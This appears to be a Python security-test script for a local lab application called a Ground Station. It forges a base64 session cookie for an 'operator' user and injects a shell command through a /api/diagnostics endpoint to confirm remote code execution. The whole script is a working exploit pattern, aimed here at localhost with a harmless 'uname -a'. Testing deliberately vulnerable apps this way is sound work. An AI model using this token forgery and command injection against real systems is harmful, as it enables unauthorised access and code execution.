#!/usr/bin/env python3
"""
Prueba Individual - Ataque 5: Ejecución Remota de Código (RCE)
Prueba la inyección de comandos en la consola del servidor vía /api/diagnostics.
"""
import base64

import requests

BASE_URL = "http://localhost:5000"

def test_attack_5():
    print("[+] Ejecutando Prueba Individual: Ataque 5 - Ejecución Remota de Código (RCE)...")
    rce_cmd = "uname -a"
    url = f"{BASE_URL}/api/diagnostics"
    token = base64.b64encode(b"operator:operator:9999999999").decode("utf-8")
    cookies = {"session_token": token}
    try:
        response = requests.post(url, json={"cmd": rce_cmd}, cookies=cookies, timeout=5)
        print(f"[*] POST {url} (cmd='{rce_cmd}') - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Vulnerabilidad RCE confirmada! Salida del comando ejecutado:")
            print(response.json())
        else:
            print(f"[!] Respuesta: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_5()
